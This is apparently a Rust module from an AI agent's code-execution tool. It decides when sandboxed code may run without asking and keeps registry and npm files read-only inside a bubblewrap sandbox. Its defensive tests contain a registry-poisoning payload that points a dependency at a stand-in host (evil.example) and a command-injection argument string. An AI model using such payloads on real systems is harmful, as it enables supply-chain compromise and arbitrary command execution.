//! What makes a `code_execute` or `script_run` call contained, so it may run unasked, and what the
//! card says when it is not (#1063).
//!
//! Contained means: the strict sandbox, enforced here by bubblewrap, and nothing run outside it
//! first. The automatic dependency install is outside it: `pip3`/`npm`/`gem install` run as the
//! person, with the network, on packages named by the code's own imports or by the script's entry
//! in the registry, and a package's build code runs when it installs. So a call with any
//! dependency is not contained and asks, with the packages on the card (security review of #1063,
//! H2).
//!
//! What a strict run can change is also what a later run outside the sandbox reads: the scripts
//! directory is bound read-write into the sandbox. The registry (whose `dependencies` the next
//! `script_run` installs) and the package manager's files in that directory (`.npmrc`,
//! `package.json`, which the next `npm install` there would follow) are bound read-only over it.

use std::path::Path;

use super::{has_bwrap, load_registry, sanitize_name, scripts_dir, SandboxMode};

/// Whether a call may run unasked: strict, enforced, and with nothing to install outside it.
pub(super) fn contained(sandbox: SandboxMode, deps: &[String]) -> bool {
    sandbox == SandboxMode::Strict && deps.is_empty() && has_bwrap()
}

/// The card's word on what is installed outside the sandbox first, or nothing.
pub(super) fn installs(language: &str, deps: &[String]) -> String {
    if deps.is_empty() {
        return String::new();
    }
    let tool = match language {
        "python" => "pip3",
        "node" | "javascript" | "typescript" => "npm",
        "ruby" => "gem",
        _ => return String::new(),
    };
    format!("first installs, outside any sandbox, with network, as the person ({tool}): {}", deps.join(", "))
}

/// A stored script as the card shows it and the run must find it: its text, the packages its
/// entry installs, its language. Empty if there is no such script.
pub(super) fn stored(name: &str) -> (String, Vec<String>, String) {
    let safe = sanitize_name(name);
    load_registry()
        .get(&safe)
        .map(|e| (std::fs::read_to_string(scripts_dir().join(&e.filename)).unwrap_or_default(), e.dependencies.clone(), e.language.clone()))
        .unwrap_or_default()
}

/// What the run says when the script or its packages are no longer what the card showed.
pub(super) const CHANGED: &str = "Error: the script or the packages it installs changed after it was shown, so it was not run. Run it again to be asked about what it is now.";

/// Where a script runs, in words for the card.
pub(super) fn sandbox_words(mode: SandboxMode) -> String {
    match mode {
        SandboxMode::Strict if has_bwrap() => "this machine, inside the strict sandbox".to_string(),
        SandboxMode::Strict => "this machine, with no sandbox (bubblewrap is not installed here, so strict is not enforced)".to_string(),
        SandboxMode::Network => "this machine, with network access".to_string(),
        SandboxMode::None => "this machine, with no sandbox at all".to_string(),
    }
}

/// Files in the scripts directory that code outside the sandbox reads later, with what each holds
/// when there is none yet. Each is made if missing (a mount needs something to cover) and bound
/// read-only over the read-write directory.
const KEPT: &[(&str, &str)] = &[("registry.json", "{}"), (".npmrc", ""), ("package.json", "{}")];

/// The bubblewrap arguments that keep [`KEPT`] read-only inside a run that binds `workspace`
/// read-write. A file that cannot be made is still named: bubblewrap then refuses to start, and
/// there is no run rather than a registry the sandbox can rewrite.
pub(super) fn kept_read_only(workspace: &Path) -> Vec<String> {
    let mut args = Vec::new();
    for (name, empty) in KEPT {
        let path = workspace.join(name);
        if std::fs::symlink_metadata(&path).is_err() {
            let _ = std::fs::write(&path, empty);
        }
        let shown = path.to_string_lossy().into_owned();
        args.extend(["--ro-bind".to_string(), shown.clone(), shown]);
    }
    args
}

/// Install dependencies before execution. Returns error message if installation fails.
pub(super) fn install_deps(language: &str, deps: &[String]) -> Option<String> {
    if deps.is_empty() { return None; }

    let (cmd, args_prefix): (&str, &[&str]) = match language {
        "python" => ("pip3", &["install", "-q", "--break-system-packages"]),
        "node" | "javascript" | "typescript" => ("npm", &["install", "--no-save", "--silent"]),
        "ruby" => ("gem", &["install", "--no-document"]),
        _ => return None,
    };

    tracing::info!(lang = language, deps = ?deps, "Auto-installing dependencies");

    let mut command = std::process::Command::new(cmd);
    command.args(args_prefix);
    command.args(deps);
    command.current_dir(scripts_dir());

    match command.output() {
        Ok(output) if output.status.success() => None,
        Ok(output) => {
            let err = String::from_utf8_lossy(&output.stderr);
            Some(format!("Dependency install failed ({cmd}): {}", err.chars().take(500).collect::<String>()))
        }
        Err(e) => Some(format!("Could not run {cmd}: {e}")),
    }
}

#[cfg(all(test, unix))]
mod tests {
    use super::super::{build_bwrap_args, CodeExecuteTool, Tool, REGISTRY_FILE};
    use super::*;
    use crate::outward_testing::{first_card, installed, shown, with_ctx};

    /// `import requests` in strict code used to run unasked, after `pip3 install requests` ran as
    /// the person with the network: a package's build code, chosen by the code (review H2).
    #[test]
    fn strict_code_whose_imports_are_installed_first_asks_and_names_the_packages() {
        let (_shell, heard) = installed("code-deps", "pending", "denied");
        let code = "import requests\nprint(1)";
        let said = with_ctx(|ctx| CodeExecuteTool.execute(ctx, &serde_json::json!({ "code": code, "language": "python" })));
        assert!(said.contains("said no"), "{said}");
        let card = first_card(&heard);
        assert_eq!(shown(&card, "what"), code);
        let more = shown(&card, "more");
        assert!(more.contains("pip3") && more.contains("requests") && more.contains("outside any sandbox"), "{more}");
        assert!(!contained(SandboxMode::Strict, &["requests".to_string()]));
    }

    /// The registry, `.npmrc` and `package.json` are bound read-only over the read-write scripts
    /// directory, after it, so the mount on top wins.
    #[test]
    fn the_strict_sandbox_binds_what_later_runs_read_read_only() {
        let dir = std::env::temp_dir().join(format!("coder-kept-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let args = build_bwrap_args(SandboxMode::Strict, &dir, &dir.join("output"));
        let rw = args.iter().position(|a| a == "--bind").expect("the workspace is bound");
        for name in ["registry.json", ".npmrc", "package.json"] {
            let path = dir.join(name).to_string_lossy().into_owned();
            let at = args.windows(3).position(|w| w[0] == "--ro-bind" && w[1] == path && w[2] == path).unwrap_or_else(|| panic!("{name}: {args:?}"));
            assert!(at > rw, "{name} is bound before the workspace and would be covered");
            assert!(dir.join(name).exists(), "{name} is made so it can be covered");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// Reproduced end to end where bubblewrap runs and the scripts directory can be made: strict
    /// code, run unasked, cannot rewrite the registry the next `script_run` installs from. The
    /// registry is put back as it was whatever happens.
    #[test]
    fn strict_code_cannot_rewrite_the_registry() {
        if !has_bwrap() || std::fs::create_dir_all(scripts_dir()).is_err() || std::process::Command::new("python3").arg("-V").output().is_err() {
            eprintln!("skipped: needs bubblewrap, python3 and a writable {}", scripts_dir().display());
            return;
        }
        let before = std::fs::read(REGISTRY_FILE).ok();
        if before.is_none() {
            std::fs::write(REGISTRY_FILE, "{}").unwrap();
        }
        let was = std::fs::read(REGISTRY_FILE).unwrap();
        let code = format!("open({REGISTRY_FILE:?}, 'w').write('{{\"x\": {{\"dependencies\": [\"git+https://evil.example/x.git\"]}}}}')");
        let (_shell, heard) = installed("code-registry", "pending", "denied");
        let said = with_ctx(|ctx| CodeExecuteTool.execute(ctx, &serde_json::json!({ "code": code, "language": "python" })));
        let after = std::fs::read(REGISTRY_FILE).unwrap();
        match before {
            Some(b) => std::fs::write(REGISTRY_FILE, b).unwrap(),
            None => std::fs::remove_file(REGISTRY_FILE).unwrap(),
        }
        assert!(heard.lock().unwrap().is_empty(), "strict code with no imports runs unasked: {said}");
        assert_eq!(String::from_utf8_lossy(&after), String::from_utf8_lossy(&was), "{said}");
        assert!(said.contains("Read-only file system") || said.contains("Errno"), "{said}");
    }

    /// Sweep of #1063: a script's arguments are shown on the card as arguments, but inside bwrap
    /// they were appended raw to a `sh -c` line, where `;` and `$(…)` are commands. Now they reach
    /// the script as the words they are, as they do without bwrap.
    #[test]
    fn script_arguments_reach_the_script_as_words_inside_the_sandbox() {
        if !has_bwrap() || std::fs::create_dir_all(scripts_dir()).is_err() {
            return eprintln!("skipped: needs bubblewrap and a writable {}", scripts_dir().display());
        }
        let script = scripts_dir().join(format!("_argv_test_{}.sh", std::process::id()));
        std::fs::write(&script, "#!/bin/sh\nfor a in \"$@\"; do echo \"<$a>\"; done\n").unwrap();
        let r = super::super::execute_script(&script, "bash", "a; echo PWNED $(echo X) 'b c'", &Default::default(), 20, None, SandboxMode::Strict);
        let _ = std::fs::remove_file(&script);
        assert_eq!(r.stdout.trim(), "<a;>\n<echo>\n<PWNED>\n<$(echo>\n<X)>\n<b c>", "{}", r.stderr);
    }
}
